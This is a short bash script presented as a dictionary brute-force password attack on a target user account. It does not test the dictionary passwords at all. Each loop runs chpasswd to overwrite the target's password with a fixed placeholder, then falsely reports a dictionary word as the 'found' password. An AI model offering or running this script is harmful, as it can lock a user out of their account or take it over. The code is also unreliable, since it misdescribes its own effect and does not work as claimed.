#!/bin/bash

newPassword="Your password to be new password - CHANGE ME"
read -p "Enter the target username: " username
read -p "Enter the password dictionary file path: " dictionary


echo "Starting brute force attack on user $username..."

while read password; do
  echo "Trying password: $password"
  echo "$username:$newPassword" | chpasswd
  if [[ $? -eq 0 ]]; then
    echo "Password found: $password"
    break
  fi
done < "$dictionary"

echo "Brute force attack complete."
